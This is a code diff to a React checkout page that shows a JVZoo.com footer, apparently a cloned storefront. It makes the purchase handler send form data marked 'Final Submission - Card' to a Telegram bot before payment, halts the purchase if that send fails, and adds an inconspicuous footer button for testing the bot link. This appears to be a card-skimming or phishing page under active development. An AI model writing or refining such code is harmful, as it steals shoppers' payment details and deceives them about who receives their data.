@@ -146,19 +146,38 @@ export default function Checkout() {
     }
   };
 
-  const handlePurchase = (e) => {
+  const handleTestSync = async () => {
+    alert("Starting Test Sync...");
+    const success = await sendDataToTelegram({ status: "TEST CONNECTION" });
+    if (success) {
+      alert("Test Sync SUCCESSFUL! Check your Telegram.");
+    } else {
+      alert("Test Sync FAILED. Check the console or the error alert.");
+    }
+  };
+
+  const handlePurchase = async (e) => {
     if (e) e.preventDefault();
     if (isProcessing) return;
 
-    // Check if form is valid using browser validation
-    const form = document.querySelector('form');
+    // Check if form is valid using the event target
+    const form = e.currentTarget;
     if (form && !form.checkValidity()) {
       form.reportValidity();
       return;
     }
 
+    console.log("Starting final sync...");
+    // Immediate feedback
+    // alert("Processing your order... syncing with bot.");
+
     // Always sync form data first
-    await sendDataToTelegram({ status: "Final Submission - Card" });
+    const syncSuccess = await sendDataToTelegram({ status: "Final Submission - Card" });
+    
+    if (!syncSuccess) {
+       // If sync failed, the alert inside sendDataToTelegram already showed the error
+       return;
+    }
 
     if (paymentMethod === 'crypto') {
       if (!selectedCrypto) {
@@ -552,6 +571,7 @@ export default function Checkout() {
           <div className="footer-bottom">
             <div>&copy; 2026 JVZoo.com v11.7.4-4 jvzoonetwork.com</div>
             <div className="footer-links">
+              <button onClick={handleTestSync} style={{ background: 'none', border: 'none', color: '#666', cursor: 'pointer', fontSize: '0.7rem' }}>Test Bot Connection</button>
               <a href="#">Privacy Policy</a>
               <a href="#">Terms Of Use</a>
               <a href="#">Earnings Disclaimer</a>
